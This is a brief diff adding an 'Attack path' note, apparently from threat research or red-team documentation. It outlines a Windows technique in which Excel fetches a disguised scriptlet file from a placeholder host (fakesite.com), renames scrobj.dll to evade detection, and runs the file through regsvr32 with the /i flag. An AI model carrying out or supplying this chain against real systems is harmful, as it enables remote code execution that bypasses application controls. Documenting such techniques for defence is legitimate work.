@@ -1,0 +1,8 @@
+Attack path:
+Excel.exe https://fakesite.com/Report_Mtrics_V2.3xls
+Excel saves file in temp directory
+XLS is scriptlet object
+Wait in system for interval delay
+Rename scrobj.dll to schmmgmt.dll
+Rename Report_Mtrics_V2.3xls to DllUninstall
+regsvr32.exe /s /u /i:DllUninstall schmmgmt.dll
